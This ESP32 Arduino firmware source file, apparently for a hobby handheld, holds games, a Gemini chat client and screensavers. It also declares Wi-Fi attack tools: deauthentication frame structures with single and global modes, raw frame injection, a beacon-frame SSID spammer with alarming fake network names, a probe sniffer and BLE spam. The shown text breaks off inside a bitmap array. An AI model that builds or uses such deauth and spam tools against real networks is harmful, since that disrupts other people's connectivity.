#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <WiFi.h>
#include <WiFiClientSecure.h>
#include <HTTPClient.h>
#include <ArduinoJson.h>
#include <Preferences.h>
#include <Adafruit_NeoPixel.h>
#include <LittleFS.h>
#include <time.h>
#include <esp_sntp.h>
#include <esp_wifi.h>
#include <Fonts/Org_01.h>
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEServer.h>
#include <WebServer.h>
#include <Update.h>
#include <ESPmDNS.h>
#include "secrets.h"

// NeoPixel LED settings
#define NEOPIXEL_PIN 48
#define NEOPIXEL_COUNT 1
Adafruit_NeoPixel pixels(NEOPIXEL_COUNT, NEOPIXEL_PIN, NEO_GRB + NEO_KHZ800);

// NeoPixel Effect State
uint32_t neoPixelColor = 0;
unsigned long neoPixelEffectEnd = 0;
void triggerNeoPixelEffect(uint32_t color, int duration);
void updateNeoPixel();

// Performance settings
#define CPU_FREQ 240
#define I2C_FREQ 2000000
#define TARGET_FPS 90
#define FRAME_TIME (1000 / TARGET_FPS)

#define PHYSICS_FPS 120
#define PHYSICS_TIME (1000 / PHYSICS_FPS)

// Delta Time for smooth, frame-rate independent movement
unsigned long lastFrameMillis = 0;
unsigned long lastPhysicsUpdate = 0;
float deltaTime = 0.0;

// App State Machine
enum AppState {
  STATE_WIFI_MENU,
  STATE_WIFI_SCAN,
  STATE_PASSWORD_INPUT,
  STATE_KEYBOARD,
  STATE_CHAT_RESPONSE,
  STATE_MAIN_MENU,
  STATE_API_SELECT,
  STATE_LOADING,
  STATE_GAME_SPACE_INVADERS,
  STATE_GAME_SIDE_SCROLLER,
  STATE_GAME_PONG,
  STATE_GAME_RACING,
  STATE_RACING_MODE_SELECT,
  STATE_GAME_SELECT,
  STATE_SYSTEM_MENU,
  STATE_SYSTEM_PERF,
  STATE_SYSTEM_NET,
  STATE_SYSTEM_DEVICE,
  STATE_SYSTEM_BENCHMARK,
  STATE_SYSTEM_POWER,
  STATE_SYSTEM_SUB_STATUS,
  STATE_SYSTEM_SUB_SETTINGS,
  STATE_SYSTEM_SUB_TOOLS,
  STATE_TOOL_SPAMMER,
  STATE_TOOL_DETECTOR,
  STATE_DEAUTH_SELECT,
  STATE_TOOL_DEAUTH,
  STATE_TOOL_PROBE_SNIFFER,
  STATE_TOOL_BLE_MENU,
  STATE_TOOL_BLE_RUN,
  STATE_TOOL_COURIER,
  STATE_PIN_LOCK,
  STATE_CHANGE_PIN,
  STATE_SCREEN_SAVER,
  STATE_VIDEO_PLAYER
};

// OLED Display settings
#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
#define OLED_RESET -1
#define SCREEN_ADDRESS 0x3C
#define SDA_PIN 41
#define SCL_PIN 40
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);

// Button pins
#define BTN_UP 10
#define BTN_DOWN 11
#define BTN_LEFT 9
#define BTN_RIGHT 13
#define BTN_SELECT 14
#define BTN_BACK 12

// TTP223 Capacitive Touch Button pins
#define TOUCH_LEFT 1
#define TOUCH_RIGHT 2

const char* geminiEndpoint = "https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash-lite:generateContent";

// Centralized Preferences Manager
Preferences preferences;

// ================================================================
// GLOBAL VARIABLES (Moved to top to fix scope issues)
// ================================================================

// Screen Brightness
int screenBrightness = 255;

// Keyboard & Input Globals
int cursorX = 0, cursorY = 0;
String userInput = "";
String passwordInput = "";
String selectedSSID = "";
String aiResponse = "";
int scrollOffset = 0;
int menuSelection = 0;
unsigned long lastDebounce = 0;
const unsigned long debounceDelay = 150;

// Keyboard layouts
const char* keyboardLower[3][10] = {
  {"q", "w", "e", "r", "t", "y", "u", "i", "o", "p"},
  {"a", "s", "d", "f", "g", "h", "j", "k", "l", "<"},
  {"#", "z", "x", "c", "v", "b", "n", "m", " ", "OK"}
};

const char* keyboardUpper[3][10] = {
  {"Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P"},
  {"A", "S", "D", "F", "G", "H", "J", "K", "L", "<"},
  {"#", "Z", "X", "C", "V", "B", "N", "M", ".", "OK"}
};

const char* keyboardNumbers[3][10] = {
  {"1", "2", "3", "4", "5", "6", "7", "8", "9", "0"},
  {"!", "@", "#", "$", "%", "^", "&", "*", "(", ")"},
  {"#", "-", "_", "=", "+", "[", "]", "?", ".", "OK"}
};

const char* keyboardPin[4][3] = {
  {"1", "2", "3"},
  {"4", "5", "6"},
  {"7", "8", "9"},
  {"<", "0", "OK"}
};

enum KeyboardMode { MODE_LOWER, MODE_UPPER, MODE_NUMBERS };
KeyboardMode currentKeyboardMode = MODE_LOWER;

enum KeyboardContext {
  CONTEXT_CHAT,
  CONTEXT_WIFI_PASSWORD,
  CONTEXT_BLE_NAME
};
KeyboardContext keyboardContext = CONTEXT_CHAT;

void savePreferenceString(const char* key, String value) {
  preferences.begin("app-config", false); // RW
  preferences.putString(key, value);
  preferences.end();
}

String loadPreferenceString(const char* key, String defaultValue) {
  preferences.begin("app-config", true); // RO
  String value = preferences.getString(key, defaultValue);
  preferences.end();
  return value;
}

void savePreferenceInt(const char* key, int value) {
  preferences.begin("app-config", false); // RW
  preferences.putInt(key, value);
  preferences.end();
}

int loadPreferenceInt(const char* key, int defaultValue) {
  preferences.begin("app-config", true); // RO
  int value = preferences.getInt(key, defaultValue);
  preferences.end();
  return value;
}

void savePreferenceBool(const char* key, bool value) {
  preferences.begin("app-config", false); // RW
  preferences.putBool(key, value);
  preferences.end();
}

bool loadPreferenceBool(const char* key, bool defaultValue) {
  preferences.begin("app-config", true); // RO
  bool value = preferences.getBool(key, defaultValue);
  preferences.end();
  return value;
}

void clearPreferenceNamespace() {
  preferences.begin("app-config", false);
  preferences.clear();
  preferences.end();
}

// WiFi Scanner
struct WiFiNetwork {
  String ssid;
  int rssi;
  bool encrypted;
};
WiFiNetwork networks[20];
int networkCount = 0;
int selectedNetwork = 0;
int wifiPage = 0;
const int wifiPerPage = 4;

// WiFi Auto-off settings
unsigned long lastWiFiActivity = 0;

// Game Effects System
#define MAX_PARTICLES 40 // Increased for S3
struct Particle {
  float x, y;
  float vx, vy;
  int life;
  bool active;
  uint16_t color; // Not really used on monochrome OLED, but good for logic differentiation
};
Particle particles[MAX_PARTICLES];
int screenShake = 0;

void spawnExplosion(float x, float y, int count) {
  for (int i = 0; i < count; i++) {
    for (int j = 0; j < MAX_PARTICLES; j++) {
      if (!particles[j].active) {
        particles[j].active = true;
        particles[j].x = x;
        particles[j].y = y;
        float angle = random(0, 360) * PI / 180.0;
        float speed = random(5, 30) / 10.0; // Faster particles
        particles[j].vx = cos(angle) * speed;
        particles[j].vy = sin(angle) * speed;
        particles[j].life = random(15, 45); // Longer life
        break;
      }
    }
  }
}

void updateParticles() {
  for (int i = 0; i < MAX_PARTICLES; i++) {
    if (particles[i].active) {
      particles[i].x += particles[i].vx * 60.0f * deltaTime;
      particles[i].y += particles[i].vy * 60.0f * deltaTime;
      particles[i].life--;
      if (particles[i].life <= 0) particles[i].active = false;
    }
  }
}

void drawParticles() {
  for (int i = 0; i < MAX_PARTICLES; i++) {
    if (particles[i].active) {
      if (particles[i].life > 5 || particles[i].life % 2 == 0) {
        display.drawPixel((int)particles[i].x, (int)particles[i].y, SSD1306_WHITE);
      }
    }
  }
}

int loadingFrame = 0;
unsigned long lastLoadingUpdate = 0;
int selectedAPIKey = 1;

// High Scores
int highScoreInvaders = 0;
int highScoreScroller = 0;
int highScoreRacing = 0;

// Performance Metrics
unsigned long perfFrameCount = 0;
unsigned long perfLoopCount = 0;
unsigned long perfLastTime = 0;
int perfFPS = 0;
int perfLPS = 0;
bool showFPS = false;

int systemMenuSelection = 0;
float systemMenuScrollY = 0;
int currentCpuFreq = 240;

// I2C Benchmark Globals
int currentI2C = 1000000;
int recommendedI2C = 1000000;
bool benchmarkDone = false;

struct I2CStats {
  uint32_t successful = 0;
  uint32_t failed = 0;
  void reset() { successful = 0; failed = 0; }
};
I2CStats i2cStats;

// Cached Status Bar Data
int cachedRSSI = 0;
String cachedTimeStr = "";
unsigned long lastStatusBarUpdate = 0;

// Screen Saver & Lock Globals
unsigned long lastInputTime = 0;
const unsigned long SCREEN_SAVER_TIMEOUT = 120000; // 2 minutes
bool pinLockEnabled = false;
String pinCode = "1234";
String inputPin = "";
AppState stateBeforeScreenSaver = STATE_MAIN_MENU;
AppState stateAfterUnlock = STATE_MAIN_MENU;

int screensaverMode = 0; // 0 = Bacteria, 1 = Matrix

// ========== ARTIFICIAL LIFE ENGINE ==========
#define LIFE_W 64   // Grid Width (128/2)
#define LIFE_H 32   // Grid Height (64/2)
#define LIFE_SCALE 2

uint8_t lifeGrid[LIFE_W][LIFE_H];
uint8_t lifeNext[LIFE_W][LIFE_H];
unsigned long lastLifeUpdate = 0;

void initLife() {
  for (int x = 0; x < LIFE_W; x++) {
    for (int y = 0; y < LIFE_H; y++) {
      lifeGrid[x][y] = random(0, 2);
    }
  }
}

int countNeighbors(int x, int y) {
  int sum = 0;
  for (int i = -1; i < 2; i++) {
    for (int j = -1; j < 2; j++) {
      int col = (x + i + LIFE_W) % LIFE_W;
      int row = (y + j + LIFE_H) % LIFE_H;
      sum += lifeGrid[col][row];
    }
  }
  sum -= lifeGrid[x][y];
  return sum;
}

void updateLifeEngine() {
  if (millis() - lastLifeUpdate < 100) return;
  lastLifeUpdate = millis();

  for (int x = 0; x < LIFE_W; x++) {
    for (int y = 0; y < LIFE_H; y++) {
      int state = lifeGrid[x][y];
      int neighbors = countNeighbors(x, y);

      if (state == 0 && neighbors == 3) {
        lifeNext[x][y] = 1;
      } else if (state == 1 && (neighbors < 2 || neighbors > 3)) {
        lifeNext[x][y] = 0;
      } else {
        lifeNext[x][y] = state;
      }
    }
  }

  for (int x = 0; x < LIFE_W; x++) {
    for (int y = 0; y < LIFE_H; y++) {
      lifeGrid[x][y] = lifeNext[x][y];
    }
  }
}

void drawLife() {
  display.clearDisplay();
  for (int x = 0; x < LIFE_W; x++) {
    for (int y = 0; y < LIFE_H; y++) {
      if (lifeGrid[x][y] == 1) {
        display.fillRect(x * LIFE_SCALE, y * LIFE_SCALE, LIFE_SCALE, LIFE_SCALE, SSD1306_WHITE);
      }
    }
  }
  display.display();
}

// ========== MATRIX RAIN EFFECT ==========
#define MATRIX_COLS 22
#define MATRIX_MIN_SPEED 1
#define MATRIX_MAX_SPEED 3

struct MatrixDrop {
  float y;
  float speed;
  int length;
  char chars[10];
};

MatrixDrop matrixDrops[MATRIX_COLS];

void initMatrix() {
  for (int i = 0; i < MATRIX_COLS; i++) {
    matrixDrops[i].y = random(-100, 0);
    matrixDrops[i].speed = random(10, 30) / 10.0;
    matrixDrops[i].length = random(4, 8);

    for (int j = 0; j < 10; j++) {
      matrixDrops[i].chars[j] = (char)random(33, 126);
    }
  }
}

void updateMatrix() {
  // Simple throttle to avoid running too fast if loop is fast
  static unsigned long lastMatrixUpdate = 0;
  if (millis() - lastMatrixUpdate < 33) return; // ~30 FPS
  lastMatrixUpdate = millis();

  for (int i = 0; i < MATRIX_COLS; i++) {
    matrixDrops[i].y += matrixDrops[i].speed;

    if (matrixDrops[i].y > SCREEN_HEIGHT + (matrixDrops[i].length * 8)) {
      matrixDrops[i].y = random(-50, 0);
      matrixDrops[i].speed = random(15, 40) / 10.0;

      for (int j = 0; j < 10; j++) {
        matrixDrops[i].chars[j] = (char)random(33, 126);
      }
    }

    if (random(0, 20) == 0) {
       int charIdx = random(0, matrixDrops[i].length);
       matrixDrops[i].chars[charIdx] = (char)random(33, 126);
    }
  }
}

void drawMatrix() {
  display.clearDisplay();
  display.setTextSize(1);

  for (int i = 0; i < MATRIX_COLS; i++) {
    int x = i * 6;

    for (int j = 0; j < matrixDrops[i].length; j++) {
      int charY = (int)matrixDrops[i].y - (j * 8);

      if (charY > -8 && charY < SCREEN_HEIGHT) {

        if (j == 0) {
          display.setTextColor(SSD1306_WHITE, SSD1306_BLACK);
        }
        else {
          if ((i + j) % 2 == 0) {
             display.setTextColor(SSD1306_WHITE, SSD1306_BLACK);
          } else {
             continue;
          }
        }

        display.setCursor(x, charY);
        display.print(matrixDrops[i].chars[j]);
      }
    }
  }
  display.display();
}

// --- DEAUTH DEFINITIONS ---
typedef struct {
  int16_t fctl;
  int16_t duration;
  uint8_t dest[6];
  uint8_t src[6];
  uint8_t bssid[6];
  int16_t seqctl;
} __attribute__((packed)) mac_hdr_t;

void scanWiFiNetworks();

typedef struct {
  mac_hdr_t hdr;
  uint8_t payload[];
} wifi_packet_t;

struct deauth_frame_t {
  uint8_t frame_control[2];
  uint8_t duration[2];
  uint8_t station[6];
  uint8_t sender[6];
  uint8_t access_point[6];
  uint8_t seq_ctl[2];
  uint16_t reason;
} __attribute__((packed));

deauth_frame_t deauth_frame;
int deauth_type = 0;
int eliminated_stations = 0;
#define DEAUTH_TYPE_SINGLE 0
#define DEAUTH_TYPE_GLOBAL 1
#define NUM_FRAMES_PER_DEAUTH 3
#define DEAUTH_BLINK_TIMES 1
#define DEAUTH_BLINK_DURATION 20
#define AP_SSID "ESP32_Cloner"
#define AP_PASS "password123"

wifi_promiscuous_filter_t filt = {
    .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT
};

// extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) { return 0; }
esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);

// --- SSID SPAMMER CONFIG ---
const char* spamPrefixes[] = {
  "VIRUS", "MALWARE", "TROJAN", "WORM", "SPYWARE",
  "RANSOMWARE", "BOTNET", "ROOTKIT", "KEYLOGGER", "ADWARE",
  "POLISI_SIBER", "BIN_SURVEILLANCE", "FBI_VAN", "CIA_SAFEHOUSE", "NSA_NODE",
  "INTERPOL_HQ", "DENSUS_88", "SATELIT_MATA2", "CCTV_KOTA", "DRONE_INTEL",
  "HP_MELEDAK", "SEDOT_PULSA", "HACK_CAMERA", "FORMAT_DATA", "DELETE_OS",
  "SYSTEM_CRASH", "BOOTLOOP", "OVERHEAT", "BATTERY_DRAIN", "SIM_CLONING",
  "JANGAN_KONEK", "ADA_HANTU", "RUMAH_ANGKER", "POCONG_GAMING", "KUNTILANAK",
  "TUYUL_ONLINE", "SANTET_E-WALLET", "PELAKOR_DETECTED", "HUTANG_BAYAR",
  "FREE_WIFI_SCAM", "LOGIN_FB_GRATIS", "PHISHING_LINK", "CLICKBAIT", "404_NOT_FOUND",
  "ACCESS_DENIED", "BANNED_USER", "RESTRICTED_AREA", "DANGER_ZONE", "HIGH_VOLTAGE",
  "ASUS_ROG", "IPHONE_15_PRO", "SAMSUNG_S24", "XIAOMI_14_ULTRA", "STARLINK_V2"
};
const int TOTAL_PREFIXES = 54;
uint8_t spamChannel = 1;

String generateRandomSSID() {
  String ssid = String(spamPrefixes[random(0, TOTAL_PREFIXES)]);
  // Add random suffix for uniqueness
  if (random(0, 2)) {
    ssid += "_";
    ssid += String(random(100, 999));
  }
  // Sometimes add Hex
  if (random(0, 5) == 0) {
    ssid += "_0x";
    ssid += String(random(0, 255), HEX);
  }
  return ssid;
}

// Raw 802.11 Beacon Frame Packet
uint8_t packet[128] = {
  0x80, 0x00, // Frame Control (Beacon)
  0x00, 0x00, // Duration
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Dest Addr (Broadcast)
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Src Addr (Placeholder)
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (Placeholder)
  0x00, 0x00, // Seq-ctl
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Timestamp
  0x64, 0x00, // Beacon Interval
  0x31, 0x04  // Capabilities
};

// --- DEAUTH DETECTOR CONFIG ---
int deauthCount = 0;
unsigned long lastDeauthTime = 0;
bool underAttack = false;
String attackerMAC = "Unknown";

// --- PROBE SNIFFER CONFIG ---
String detectedProbeSSID = "Searching...";
String detectedProbeMAC = "Listening...";
String probeHistory[5]; // Simpan 5 jejak terakhir
int probeHistoryIndex = 0;

// Graphing Globals
#define GRAPH_WIDTH 64
int deauthHistory[GRAPH_WIDTH];
int graphHead = 0;
unsigned long lastGraphUpdate = 0;
int lastDeauthCount = 0;

// Forward Declarations for Screen Saver & Lock
void drawStatusBar();
void drawHeader(String text); // Forward declaration
void drawBar(int percent, int y); // Forward declaration
void drawKeyboard(int x_offset = 0);
void drawPinKeyboard(int x_offset = 0);
void changeState(AppState newState);
void toggleKeyboardMode();
const char* getCurrentKey();
void ledQuickFlash();
void drawGenericListMenu(int x_offset, const char* title, const unsigned char* icon, const char** items, int itemCount, int selection, float* scrollY);
void drawProbeSniffer();
void updateProbeSniffer();
void drawCourierTool();
void checkResiReal();

// Chat History
String chatHistory = "";

void loadChatHistory() {
  if (LittleFS.exists("/history.txt")) {
    File file = LittleFS.open("/history.txt", "r");
    if (file) {
      // Read up to 2KB to prevent RAM overflow
      while (file.available() && chatHistory.length() < 2048) {
        chatHistory += (char)file.read();
      }
      file.close();
    }
  }
}

void appendToChatHistory(String userText, String aiText) {
  String entry = "User: " + userText + "\nAI: " + aiText + "\n";

  // Update RAM (Cap at 2048)
  if (chatHistory.length() + entry.length() < 2048) {
    chatHistory += entry;
  } else {
    // If full, simplistic approach: clear RAM history to start fresh context in RAM,
    // but Flash keeps growing until cleared.
    // Better: shift out old history? For now, just stop growing RAM context.
    // Ideally we want a rolling buffer, but handling strings on microcontrollers is tricky.
    // We'll just reset the RAM context if it gets too big to keep it fresh.
    chatHistory = entry;
  }

  // Append to Flash
  File file = LittleFS.open("/history.txt", FILE_APPEND);
  if (file) {
    file.print(entry);
    file.close();
  }
}

void showStatus(String message, int delayMs);

void clearChatHistory() {
  LittleFS.remove("/history.txt");
  chatHistory = "";
  showStatus("AI Memory Wiped!", 1000);
}

// PIN Lock & Screen Saver Functions
void showPinLock(int x_offset) {
  display.clearDisplay();
  drawStatusBar();

  // Adjusted layout for 4-row keypad
  display.setTextSize(1);
  display.setCursor(x_offset + 35, 2); // Higher up
  display.print("ENTER PIN");

  display.drawRect(x_offset + 34, 12, 60, 14, SSD1306_WHITE);

  display.setCursor(x_offset + 38, 15);
  for(int i=0; i<4; i++) {
      if (i < inputPin.length()) {
          display.print("*");
      } else if (i == inputPin.length()) {
          display.print("_");
      } else {
          display.print(" ");
      }
      display.print(" ");
  }

  drawPinKeyboard(x_offset);
}

void showChangePin(int x_offset) {
  display.clearDisplay();
  drawStatusBar();

  // Adjusted layout for 4-row keypad
  display.setTextSize(1);
  display.setCursor(x_offset + 30, 2); // Higher up
  display.print("SET NEW PIN");

  display.drawRect(x_offset + 34, 12, 60, 14, SSD1306_WHITE);

  display.setCursor(x_offset + 38, 15);
  for(int i=0; i<4; i++) {
      if (i < inputPin.length()) {
          display.print(inputPin.charAt(i));
      } else if (i == inputPin.length()) {
          display.print("_");
      } else {
          display.print(" ");
      }
      display.print(" ");
  }

  drawPinKeyboard(x_offset);
}

void showScreenSaver() {
  if (screensaverMode == 0) {
      updateLifeEngine();
      drawLife();
  } else {
      updateMatrix();
      drawMatrix();
  }
}

void drawPinKeyboard(int x_offset) {
  // Numeric keypad specific layout
  int startX = x_offset + 19; // Centered roughly (128 - 90)/2
  int startY = 28; // Start below the input box (ends at 26)
  int keyW = 28;
  int keyH = 9; // Slightly taller for better look
  int gap = 2;  // More spacing

  for (int r = 0; r < 4; r++) {
    for (int c = 0; c < 3; c++) {
      int x = startX + c * (keyW + gap);
      int y = startY + r * (keyH + gap);

      const char* keyLabel = keyboardPin[r][c];

      if (r == cursorY && c == cursorX) {
        // Selected: Filled Rounded Rect
        display.fillRoundRect(x, y, keyW, keyH, 2, SSD1306_WHITE);
        display.setTextColor(SSD1306_BLACK);
      } else {
        // Normal: Outline Rounded Rect
        display.drawRoundRect(x, y, keyW, keyH, 2, SSD1306_WHITE);
        display.setTextColor(SSD1306_WHITE);
      }

      // Center text in key
      int textX = x + (keyW - (strlen(keyLabel) * 6)) / 2 + 1;
      display.setCursor(textX, y + 1);
      display.print(keyLabel);
    }
  }
  display.setTextColor(SSD1306_WHITE);
}

void handlePinLockKeyPress() {
  const char* key = keyboardPin[cursorY][cursorX];

  if (strcmp(key, "OK") == 0) {
      if (inputPin == pinCode) {
          inputPin = "";
          changeState(stateAfterUnlock);
      } else {
          inputPin = "";
          showStatus("WRONG PIN", 1000);
      }
  } else if (strcmp(key, "<") == 0) {
      if (inputPin.length() > 0) inputPin.remove(inputPin.length()-1);
  } else {
      if (inputPin.length() < 4) inputPin += key;
  }
}

void handleChangePinKeyPress() {
  const char* key = keyboardPin[cursorY][cursorX];

  if (strcmp(key, "OK") == 0) {
      if (inputPin.length() == 4) {
          pinCode = inputPin;
          savePreferenceString("pin_code", pinCode);
          inputPin = "";
          showStatus("PIN CHANGED", 1000);
          changeState(STATE_SYSTEM_MENU);
      }
  } else if (strcmp(key, "<") == 0) {
      if (inputPin.length() > 0) inputPin.remove(inputPin.length()-1);
  } else {
      if (inputPin.length() < 4) inputPin += key;
  }
}

void updateStatusBarData() {
  if (millis() - lastStatusBarUpdate > 1000) {
    lastStatusBarUpdate = millis();

    // Update RSSI
    if (WiFi.status() == WL_CONNECTED) {
       cachedRSSI = WiFi.RSSI();
    } else {
       cachedRSSI = 0;
    }

    // Update Time
    struct tm timeinfo;
    // timeout = 0 to avoid blocking
    if (getLocalTime(&timeinfo, 0)) {
       char timeStringBuff[10];
       sprintf(timeStringBuff, "%02d:%02d", timeinfo.tm_hour, timeinfo.tm_min);
       cachedTimeStr = String(timeStringBuff);
    }
  }
}

// Space Invaders Game State
#define MAX_ENEMIES 15
#define MAX_BULLETS 5
#define MAX_ENEMY_BULLETS 10
#define MAX_POWERUPS 3

struct SpaceInvaders {
  float playerX;
  float playerY;
  int playerWidth;
  int playerHeight;
  int lives;
  int score;
  int level;
  bool gameOver;
  int weaponType; // 0=single, 1=double, 2=triple
  int shieldTime;
  
  struct Enemy {
    float x, y;
    int width, height;
    bool active;
    int type; // 0=basic, 1=fast, 2=tank
    int health;
  };
  Enemy enemies[MAX_ENEMIES];
  
  struct Bullet {
    float x, y;
    bool active;
  };
  Bullet bullets[MAX_BULLETS];
  Bullet enemyBullets[MAX_ENEMY_BULLETS];
  
  struct PowerUp {
    float x, y;
    int type; // 0=weapon, 1=shield, 2=life
    bool active;
  };
  PowerUp powerups[MAX_POWERUPS];
  
  float enemyDirection; // 1=right, -1=left
  unsigned long lastEnemyMove;
  unsigned long lastEnemyShoot;
  unsigned long lastSpawn;
  bool bossActive;
  float bossX, bossY;
  int bossHealth;
};
SpaceInvaders invaders;

// Side Scroller Shooter Game State
#define MAX_OBSTACLES 8
#define MAX_SCROLLER_BULLETS 8
#define MAX_SCROLLER_ENEMIES 6

struct SideScroller {
  float playerX, playerY;
  int playerWidth, playerHeight;
  int lives;
  int score;
  int level;
  bool gameOver;
  int weaponLevel; // 1-5
  int specialCharge; // 0-100
  bool shieldActive;
  
  struct Obstacle {
    float x, y;
    int width, height;
    bool active;
    float scrollSpeed;
  };
  Obstacle obstacles[MAX_OBSTACLES];
  
  struct ScrollerBullet {
    float x, y;
    int dirX, dirY; // -1, 0, or 1
    bool active;
    int damage;
  };
  ScrollerBullet bullets[MAX_SCROLLER_BULLETS];
  
  struct ScrollerEnemy {
    float x, y;
    int width, height;
    bool active;
    int health;
    int type; // 0=basic, 1=shooter, 2=kamikaze
    int dirY;
  };
  ScrollerEnemy enemies[MAX_SCROLLER_ENEMIES];
  
  struct ScrollerEnemyBullet {
    float x, y;
    bool active;
  };
  ScrollerEnemyBullet enemyBullets[MAX_OBSTACLES];
  
  unsigned long lastMove;
  unsigned long lastShoot;
  unsigned long lastEnemySpawn;
  unsigned long lastObstacleSpawn;
  int scrollOffset;
};
SideScroller scroller;

// Pong Game State
struct Pong {
  float ballX, ballY;
  float ballDirX, ballDirY;
  float ballSpeed;
  float paddle1Y, paddle2Y;
  int paddleWidth, paddleHeight;
  int score1, score2;
  bool gameOver;
  bool aiMode; // true = vs AI, false = 2 player
  int difficulty; // 1-3

  // Trail for visual effect
  float trailX[5];
  float trailY[5];
};
Pong pong;
unsigned long pongResetTimer = 0;
bool pongResetting = false;

// Turbo Racing Game State
#define RACING_ROAD_SEGMENTS 20
#define RACING_MODE_FREE 0
#define RACING_MODE_CHALLENGE 1

struct Racing {
  float carX; // -1 to 1 (0 is center)
  float speed;
  float rpm; // 0-8000
  int gear; // 1-5
  bool clutchPressed;
  float roadCurvature; // Current curve
  float trackPosition; // Total distance
  float playerZ; // Distance into screen (camera)
  int score;
  int lives;
  int mode;
  bool gameOver;

  float bgOffset; // For parallax background

  // Track data
  float roadCurves[100]; // Pre-defined track map
  float roadHeight[100]; // Height map for hills
  float camHeight;       // Current camera height based on road

  struct RacingEnemy {
     float z; // Distance from camera
     float x; // -1 to 1
     bool active;
     float speed;
  };
  RacingEnemy enemies[5];

  struct RacingObject {
     float z;
     float side; // -1 (left) or 1 (right)
     bool active;
     int type; // 0=tree, 1=light
  };
  RacingObject scenery[10];

  int currentSegment;
};
Racing racing;


AppState currentState = STATE_MAIN_MENU;
AppState previousState = STATE_MAIN_MENU;

// UI Transition System
enum TransitionState { TRANSITION_NONE, TRANSITION_OUT, TRANSITION_IN };
TransitionState transitionState = TRANSITION_NONE;
AppState transitionTargetState;
float transitionProgress = 0.0; // 0.0 to 1.0
const float transitionSpeed = 3.5f; // Faster transitions

// Main Menu Animation Variables
float menuScrollY = 0;
float menuTargetScrollY = 0;
int mainMenuSelection = 0;
float menuTextScrollX = 0;
unsigned long lastMenuTextScrollTime = 0;

unsigned long lastUiUpdate = 0;
const int uiFrameDelay = 1000 / TARGET_FPS;

// Icons (8x8 pixel bitmaps)
const unsigned char ICON_WIFI[] PROGMEM = {
  0x00, 0x3C, 0x42, 0x99, 0x24, 0x00, 0x18, 0x00
};

const unsigned char ICON_CHAT[] PROGMEM = {
  0x7E, 0xFF, 0xC3, 0xC3, 0xC3, 0xFF, 0x18, 0x00
};

const unsigned char ICON_GAME[] PROGMEM = {
  0x3C, 0x42, 0x99, 0xA5, 0xA5, 0x99, 0x42, 0x3C
};

const unsigned char ICON_VIDEO[] PROGMEM = {
  0x7E, 0x81, 0x81, 0xBD, 0xBD, 0x81, 0x81, 0x7E
};

const unsigned char ICON_HEART[] PROGMEM = {
  0x66, 0xFF, 0xFF, 0xFF, 0x7E, 0x3C, 0x18, 0x00
};

const unsigned char ICON_SYSTEM[] PROGMEM = {
  0x3C, 0x7E, 0xDB, 0xFF, 0xC3, 0xFF, 0x7E, 0x3C
};

const unsigned char ICON_SYS_STATUS[] PROGMEM = {
  0x18, 0x3C, 0x7E, 0x18, 0x18, 0x7E, 0x3C, 0x18
};

const unsigned char ICON_SYS_SETTINGS[] PROGMEM = {
  0x3C, 0x42, 0x99, 0xBD, 0xBD, 0x99, 0x42, 0x3C
};

const unsigned char ICON_SYS_TOOLS[] PROGMEM = {
  0x18, 0x3C, 0x7E, 0xFF, 0x5A, 0x24, 0x18, 0x00
};

const unsigned char ICON_BLE[] PROGMEM = {
  0x18, 0x5A, 0xDB, 0x5A, 0x18, 0x18, 0x18, 0x18
};

const unsigned char ICON_TRUCK[] PROGMEM = {
  0x00, 0x18, 0x7E, 0x7E, 0x7E, 0x24, 0x00, 0x00
};

// Racing Car Sprites (16x16)
const unsigned char BITMAP_CAR_STRAIGHT[] PROGMEM = {
  0x03, 0xC0, 0x0F, 0xF0, 0x1F, 0xF8, 0x3F, 0xFC,
  0x33, 0xCC, 0x33, 0xCC, 0x33, 0xCC, 0x3F, 0xFC,
  0x3F, 0xFC, 0x3F, 0xFC, 0x33, 0xCC, 0x33, 0xCC,
  0x33, 0xCC, 0x3F, 0xFC, 0x1F, 0xF8, 0x07, 0xE0
};

const unsigned char BITMAP_CAR_LEFT[] PROGMEM = {
  0x01, 0xE0, 0x07, 0xF0, 0x0F, 0xF8, 0x1F, 0xFC,
  0x31, 0xCC, 0x21, 0xC4, 0x61, 0xC6, 0x7F, 0xFE,
  0x7F, 0xFE, 0x61, 0xC6, 0x61, 0x86, 0x61, 0x86,
  0x61, 0x86, 0x7F, 0xFE, 0x3F, 0xFC, 0x0F, 0xF0
};

const unsigned char BITMAP_CAR_RIGHT[] PROGMEM = {
  0x07, 0x80, 0x0F, 0xE0, 0x1F, 0xF0, 0x3F, 0xF8,
  0x33, 0x8C, 0x23, 0x84, 0x63, 0x86, 0x7F, 0xFE,
  0x7F, 0xFE, 0x63, 0x86, 0x61, 0x86, 0x61, 0x86,
  0x61, 0x86, 0x7F, 0xFE, 0x3F, 0xFC, 0x0F, 0xF0
};

const unsigned char BITMAP_ENEMY[] PROGMEM = {
  0x03, 0xC0, 0x0F, 0xF0, 0x1F, 0xF8, 0x3F, 0xFC,
  0x38, 0x1C, 0x38, 0x1C, 0x3F, 0xFC, 0x3F, 0xFC,
  0x3F, 0xFC, 0x39, 0x9C, 0x39, 0x9C, 0x39, 0x9C,
  0x3F, 0xFC, 0x1F, 0xF8, 0x0F, 0xF0, 0x03, 0xC0
};

// '09f6b70b000f29d19836dcd2ede0b6e8', 128x64px
const unsigned char epd_bitmap_09f6b70b000f29d19836dcd2ede0b6e8 [] PROGMEM = {
	0x00, 0x00, 0x00, 0x02, 0xff, 0x80, 0x1f, 0xff, 0xff, 0xc3, 0xff, 0xff, 0xff, 0xfb, 0xf8, 0x1f,
	0x00, 0x00, 0x00, 0x19, 0xfe, 0x00, 0x7f, 0xff, 0xff, 0x87, 0xff, 0xff, 0xff, 0xfb, 0xf0, 0x3f,
